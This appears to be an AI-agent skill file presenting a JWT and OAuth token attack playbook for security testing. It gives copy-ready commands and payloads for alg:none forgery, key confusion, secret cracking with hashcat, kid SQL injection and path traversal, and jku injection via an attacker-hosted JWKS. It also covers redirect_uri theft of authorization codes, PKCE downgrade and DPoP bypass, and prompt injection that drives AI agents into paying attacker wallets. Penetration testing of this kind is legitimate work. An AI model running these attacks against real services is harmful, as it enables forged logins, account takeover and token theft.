---
name: jwt-oauth-token-attacks
description: >-
  JWT and OAuth token attack playbook. Use when validating token trust, signing algorithms, key handling, claim abuse, bearer flows, and OAuth account-binding weaknesses.
---

# SKILL: JWT and OAuth 2.0 Token Attacks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert authentication token attacks. Covers JWT cryptographic attacks (alg:none, RS256→HS256, secret crack, kid/jku injection), OAuth flow attacks (CSRF, open redirect, token theft, implicit flow abuse), PKCE bypass, and token leakage via Referer/logs. This is critical for modern web applications.

## 0. RELATED ROUTING

Use this file for token-centric attacks and flow abuse. Also load:

- [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) for redirect URI, state, nonce, PKCE, and account-binding validation
- [cors cross origin misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) when browser-readable APIs or token leakage may exist cross-origin
- [saml sso assertion attacks](../saml-sso-assertion-attacks/SKILL.md) when the target uses enterprise SSO outside OAuth/OIDC

---

## 1. JWT ANATOMY

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└─────────────────────┘ └────────────────────────────┘ └──────────────────────────────────────────┘
         HEADER                     PAYLOAD                           SIGNATURE
```

**Decode in terminal**:
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# → {"alg":"HS256","typ":"JWT"}

echo "eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0" | base64 -d
# → {"userId":1234,"role":"user"}
```

**Common claim targets** (modify to escalate):
```json
{
  "role": "admin",
  "isAdmin": true,
  "userId": OTHER_USER_ID,
  "email": "victim@target.com",
  "sub": "admin",
  "permissions": ["admin", "write", "delete"],
  "tier": "premium"
}
```

---

## 2. ATTACK 1 — ALGORITHM NONE (alg:none)

Server doesn't validate signature when algorithm is "none"/"None"/"NONE":

```bash
# Burp JWT Editor / python-jwt attack:
# Step 1: Decode header
echo '{"alg":"HS256","typ":"JWT"}' | base64 → old_header

# Step 2: Create new header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 3: Modify payload (e.g., role → admin):
echo -n '{"userId":1234,"role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 4: Construct token with empty signature:
HEADER.PAYLOAD.
# OR:
HEADER.PAYLOAD
```

**Tool (jwt_tool)**:
```bash
python3 jwt_tool.py JWT_TOKEN -X a
# → automatically generates alg:none variants
```

---

## 3. ATTACK 2 — RS256 TO HS256 KEY CONFUSION

**When server uses RS256** (asymmetric — RSA private key signs, public key verifies):
- Server's public key is often discoverable (JWKS endpoint, `/certs`, source code)
- Attack: tell server "this is HS256" → server verifies HS256 HMAC using **the public key as secret**

```bash
# Step 1: Obtain public key (PEM format)
# From: /api/.well-known/jwks.json → convert to PEM
# From: /certs endpoint
# From: OpenSSL extraction from HTTPS cert

# Step 2: Use jwt_tool to sign with HS256 using public key as secret:
python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem

# Step 3: Manually:
# Modify header: {"alg":"HS256","typ":"JWT"}
# Sign entire header.payload with HMAC-SHA256 using PEM public key bytes
```

---

## 4. ATTACK 3 — JWT SECRET BRUTE FORCE

HMAC-based JWTs (HS256/HS384/HS512) with weak secret:

```bash
# hashcat (fast):
hashcat -a 0 -m 16500 "JWT_TOKEN_HERE" /usr/share/wordlists/rockyou.txt

# john:
echo "JWT_TOKEN_HERE" > jwt.txt
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

# jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d /path/to/wordlist.txt
```

**Common weak secrets to test manually**:
```
secret, password, 123456, qwerty, changeme, your-256-bit-secret,
APP_NAME, app_name, production, jwt_secret, SECRET_KEY
```

---

## 5. ATTACK 4 — kid (Key ID) INJECTION

The `kid` header parameter specifies which key to use for verification. No sanitization = injection:

### kid SQL Injection
```json
{"alg":"HS256","kid":"' UNION SELECT 'attacker_controlled_key' FROM dual--"}
```
If backend queries SQL: `SELECT key FROM keys WHERE kid = 'INPUT'`  
Result: HMAC key = `'attacker_controlled_key'` → forge any payload signed with this value.

### kid Path Traversal (file read)
```json
{"alg":"HS256","kid":"../../../../dev/null"}
```
Server reads `/dev/null` as key → empty string → sign token with empty HMAC.

```json
{"alg":"HS256","kid":"../../../../etc/hostname"}
```
Server reads hostname as key → forge tokens signed with hostname string.

---

## 6. ATTACK 5 — jku / x5u Header Injection

`jku` points to JSON Web Key Set URL. If not whitelisted:
```json
{"alg":"RS256","jku":"https://test-attacker.com/malicious-jwks.json","kid":"my-key"}
```

**Setup**:
```bash
# Generate RSA key pair:
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Create JWKS:
python3 -c "
import json, base64, struct
# ... (use python-jwcrypto or jwt_tool to export JWKS)
"

# Host malicious JWKS at test-attacker.com/malicious-jwks.json
# Sign JWT with attacker's private key
# Server fetches attacker's JWKS → verifies with attacker's public key → accepts
```

**jwt_tool automation**:
```bash
python3 jwt_tool.py JWT -X s -ju https://test-attacker.com/malicious-jwks.json
```

---

## 7. OAUTH 2.0 — STATE PARAMETER MISSING (CSRF)

State parameter prevents CSRF in OAuth. If missing:

```
Attack:
1. Click "Login with Google" → OAuth starts → intercept the redirect URL:
   https://accounts.google.com/oauth2/auth?client_id=APP_ID&redirect_uri=https://target.com/callback&state=MISSING_OR_PREDICTABLE&code=...

2. Get the authorization code (stop before exchanging it)
3. Craft URL: https://target.com/oauth/callback?code=ATTACKER_CODE
4. Victim clicks that URL → their session binds to ATTACKER's OAuth identity
→ ACCOUNT TAKEOVER
```

---

## 8. OAUTH — REDIRECT_URI BYPASS

Authorization codes are sent to `redirect_uri`. If validation is weak:

### Open Redirect in redirect_uri
```
Original: redirect_uri=https://target.com/callback
Attack:   redirect_uri=https://target.com/callback/../../../test-attacker.com
          redirect_uri=https://test-attacker.com.target.com/callback
          redirect_uri=https://target.com@test-attacker.com/callback
```

### Partial Path Match
```
Whitelist: https://target.com/callback
Attack: https://target.com/callback%2f../admin (URL path confusion)
        https://target.com/callbackXSS (prefix match only)
```

### Localhost / Development Redirect
```
redirect_uri=http://localhost/steal
redirect_uri=urn:ietf:wg:oauth:2.0:oob  (mobile apps)
```

---

## 9. OAUTH — IMPLICIT FLOW TOKEN THEFT

Implicit flow: token sent in URL fragment `#access_token=...`

**Fragment leakage scenarios**:
- Redirect to attacker page: fragment accessible via `document.referrer` or via `<script>window.location.href</script>` in target page
- Open redirect: `redirect_uri=https://target.com/open-redirect?url=https://test-attacker.com` → token in fragment lands at attacker's page

---

## 10. OAUTH — SCOPE ESCALATION

Request broader scope than authorized in authorization code:
```
Authorized scope: read:profile
Attack: During token exchange, add scope=admin or scope=read:admin
→ Does server grant requested scope or issued scope?
```

---

## 11. TOKEN LEAKAGE VECTORS

### Referer Header
Token in URL → page loads external resource → Referer leaks token:
```
https://target.com/dashboard#access_token=TOKEN
→ HTML loads: <img src="https://analytics.third-party.com/track">
→ Referer: https://target.com/dashboard#access_token=TOKEN
→ analytics.third-party.com sees token in Referer logs
```

### Server Logs
Access tokens sent in query parameters are stored in:
```
/var/log/nginx/access.log
/var/log/apache2/access.log
ELB/ALB logs (AWS)
CloudFront logs
CDN logs
```

---

## 12. 2026 EMERGING TECHNIQUES

### 12.1 OAuth 2.1 Formalization Impact (2026)

OAuth 2.1 Draft 15 makes PKCE mandatory for ALL Authorization Code flows and deprecates the implicit and password grants. `state`/`nonce` are demoted from primary CSRF defense — PKCE becomes the sole flow-integrity guarantee. This shift creates new attack surfaces:

**PKCE Downgrade (S256 → plain)**:
```
# Legitimate auth request:
GET /authorize?...&code_challenge=BASE64URL(SHA256(verifier))&code_challenge_method=S256

# Attacker intercepts and downgrades:
GET /authorize?...&code_challenge=PLAINTEXT_VERIFIER&code_challenge_method=plain

# If AS issues a code without binding the method to the code:
POST /token
grant_type=authorization_code&code=STOLEN&code_verifier=PLAINTEXT_VERIFIER&client_id=app
→ token issued, PKCE defeated
```

**code_verifier not validated / code_challenge not bound**: if the AS skips verification when `code_verifier` is present but arbitrary, any value passes.

**PAR (RFC 9126) weaknesses**: the PAR endpoint accepts signed request objects server-side; if signature verification is loose, attackers inject crafted parameters. The PAR endpoint itself becomes an injection point — `request_uri` references server-stored data that may not be re-validated.

### 12.2 DPoP (RFC 9449) Bypass (2026)

DPoP binds tokens to a client-held key pair without mTLS. Each request carries a `DPoP` proof JWT containing the public key (`jwk`), `jti`, `htm`, and `htu`.

**DPoP proof JWT replay** — missing nonce/jti binding:
```http
GET /resource HTTP/1.1
Authorization: DPoP STOLEN_TOKEN
DPoP: eyJhbGciOiJFUzI1NiIsInR5cCI6ImRwb3Arandzb24td2ViIn0...
# If AS does not enforce jti single-use or AS-issued nonce binding → replay succeeds
```

**DPoP key injection via XSS**:
```javascript
// XSS on the client app injects attacker's public key:
fetch('/token', { headers: { 'DPoP': attackerSignedProofJWT } });
// Attacker's key becomes bound to newly issued tokens → stolen tokens usable
```

**Proof JWT forgery**: if AS checks the proof signature but does not verify `proof.jwk == token.cnf.jkt`, an attacker presents a victim's token with their own proof → sender constraint bypassed.

**Refresh token interaction**: DPoP-bound refresh tokens may not re-verify the key on rotation, allowing a stolen refresh token to mint access tokens under a different key.

### 12.3 2026 JWT Library CVEs

| CVE | Library | Flaw | Impact |
|---|---|---|---|
| CVE-2026-54512 | jackson-databind | PTV (Polymorphic Type Validation) generic bypass via JWT claim deserialization gadget chain | RCE when JWT claims deserialize as POJO (cross-link ../deserialization-insecure/SKILL.md) |
| CVE-2026-44120 | Fastjson 1.2.x | Three-layer autoType bypass (`@type` + cache miss + `Throwable` subclass) in JWT payload | RCE via crafted JWT claim JSON |
| CVE-2026-31891 | Nimbus JOSE+JWT | `jwk` header auto-fetch without scheme restriction (`file://`, `gopher://`) | SSRF/LFI via JWT header (cross-link ../ssrf-server-side-request-forgery/SKILL.md) |

### 12.4 OAuth in AI Agent Frameworks (2026)

The Model Context Protocol (MCP) marks OAuth 2.1 authorization as **optional** for local transports, creating new token exposure:

- **Over-scoped agent tokens**: LangChain/CrewAI agents request broad scopes (`read`, `write`, `execute`) and cache tokens in plaintext — no per-tool scope narrowing
- **No rotation/revocation**: agents hold long-lived refresh tokens across sessions; compromised agent = persistent access with no revocation path
- **MCP optional auth → unauthenticated access**: local stdio/SSE MCP servers skip auth entirely; remote MCP servers misconfigure `redirect_uri` to localhost (cross-link ../ai-llm-attack-surface/SKILL.md)
- **x402 protocol hijack**: the x402 payment protocol enables AI agents to self-authorize HTTP 402-gated payments; prompt injection can trigger autonomous payments to attacker wallets

### 12.5 2026 Token Attack Checklist

```
□ Test PKCE downgrade: S256 → plain, does AS accept?
□ Check code_verifier is actually validated against stored challenge
□ If PAR used: test request_uri injection and signature bypass
□ If DPoP used: test jti replay, XSS key injection, jwk-to-token binding
□ Check refresh token DPoP key re-binding on rotation
□ Check Jackson/Fastjson/Nimbus versions against 2026 CVEs
□ If MCP/AI agents: check for over-scoped, non-rotating tokens
□ Test x402 payment callbacks triggerable via prompt injection
```

---

## 13. JWT TESTING CHECKLIST

```
□ Decode header + payload (base64 decode each part)
□ Identify algorithm: HS256/RS256/ES256/none
□ Modify payload fields (role, userId, isAdmin) → change signature too
□ Test alg:none → remove signature entirely
□ If RS256: find public key → attempt RS256→HS256 confusion
□ If HS256: brute force with hashcat/rockyou
□ Check kid parameter → try SQL injection + path traversal
□ Check jku/x5u header → redirect to attacker JWKS
□ Test token reuse after logout
□ Test expired token acceptance (exp claim)
□ Check for token in GET params (log leakage) vs header
```

---

## 14. OAUTH TESTING CHECKLIST

```
□ Check for state parameter in authorization request
□ Test redirect_uri manipulation (open redirect, prefix match, path confusion)
□ Can tokens be exchanged more than once?
□ Test scope escalation during token exchange
□ Implicit flow: check for token in Referer/history
□ PKCE: can code_challenge be bypassed or code_verifier be empty?
□ Check for authorization code reuse (code must be single-use)
□ Test account linking abuse: link OAuth to existing account with same email
□ Check OAuth provider confusion: use Apple ID to link where Google expected
```
